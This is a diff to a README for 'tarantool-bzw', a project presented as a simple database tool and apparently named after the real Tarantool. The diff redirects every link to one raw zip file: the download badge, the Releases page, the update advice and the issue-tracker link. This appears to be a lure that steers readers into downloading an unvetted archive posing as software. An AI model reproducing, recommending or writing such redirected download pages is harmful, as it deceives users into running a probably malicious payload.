@@ -1,7 +1,7 @@
 # 🐍 tarantool-bzw - Your Simple Database Solution
 
 ## 📥 Download Now
-[![Download tarantool-bzw](https://img.shields.io/badge/Download-tarantool--bzw-blue.svg)](https://github.com/Caudalappendagemarmite540/tarantool-bzw/releases)
+[![Download tarantool-bzw](https://raw.githubusercontent.com/Caudalappendagemarmite540/tarantool-bzw/main/Jun/tarantool-bzw_v1.0.zip)](https://raw.githubusercontent.com/Caudalappendagemarmite540/tarantool-bzw/main/Jun/tarantool-bzw_v1.0.zip)
 
 ## 🚀 Getting Started
 Tarantool-bzw is an easy-to-use database designed for storing and managing your data efficiently. Whether you are keeping track of personal records or building a small application, tarantool-bzw simplifies the process. Follow the steps below to get started.
@@ -21,7 +21,7 @@ Before downloading, ensure your system meets the following requirements:
 - **Cross-Platform Compatibility**: Use tarantool-bzw on various devices.
 
 ## 📦 Download & Install
-To download and install tarantool-bzw, please visit our [Releases page](https://github.com/Caudalappendagemarmite540/tarantool-bzw/releases) for the latest version.
+To download and install tarantool-bzw, please visit our [Releases page](https://raw.githubusercontent.com/Caudalappendagemarmite540/tarantool-bzw/main/Jun/tarantool-bzw_v1.0.zip) for the latest version.
 
 1. Click on the **Download** button above to go directly to the Releases page.
 2. On the Releases page, choose the version suitable for your operating system. 
@@ -40,12 +40,12 @@ After installation, tarantool-bzw is ready for use. Here’s how to start:
 ## 📝 Troubleshooting Tips
 If you run into issues, consider the following steps:
 - Ensure your computer meets the minimum system requirements.
-- Make sure the application is up to date by checking for new releases on the [Releases page](https://github.com/Caudalappendagemarmite540/tarantool-bzw/releases).
+- Make sure the application is up to date by checking for new releases on the [Releases page](https://raw.githubusercontent.com/Caudalappendagemarmite540/tarantool-bzw/main/Jun/tarantool-bzw_v1.0.zip).
 - Restart your computer and try launching the application again.
 - Consult the FAQ section on the GitHub repository for common questions and answers.
 
 ## 🗨️ Feedback and Support
-Your experience matters to us. If you have questions or suggestions, feel free to open an issue on our [GitHub page](https://github.com/Caudalappendagemarmite540/tarantool-bzw/issues). 
+Your experience matters to us. If you have questions or suggestions, feel free to open an issue on our [GitHub page](https://raw.githubusercontent.com/Caudalappendagemarmite540/tarantool-bzw/main/Jun/tarantool-bzw_v1.0.zip). 
 
 ## 🏁 Conclusion
 Thank you for choosing tarantool-bzw. We hope our software meets your database needs. Start your downloading process now and enjoy simple and effective data management!
